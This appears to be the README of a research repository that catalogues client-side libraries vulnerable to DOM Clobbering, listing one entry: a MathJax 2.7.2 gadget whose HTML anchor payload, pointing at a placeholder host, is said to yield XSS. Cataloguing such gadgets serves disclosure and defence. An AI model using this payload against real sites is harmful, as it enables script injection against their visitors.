# DOM Clobbering Collection

In this repo, we collect a list of client-side libraries that are either vulnerable to HTML injection or contain DOM Clobbering gadgets that lead to severe consequences, e.g., XSS.

## HTML Injection

## DOM Clobbering Gadgets

| Library | Version | Payloads | Impact | Found By |
|:-------:|:-------:|----------|:------:|:--------:|
| [MathJax](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/mathjax.md) | 2.7.2 | ```<a id="MathJax"></a> <a id="MathJax" name="root" href="https://xxx.xxx.xxx"></a>``` | XSS | TheHulk |
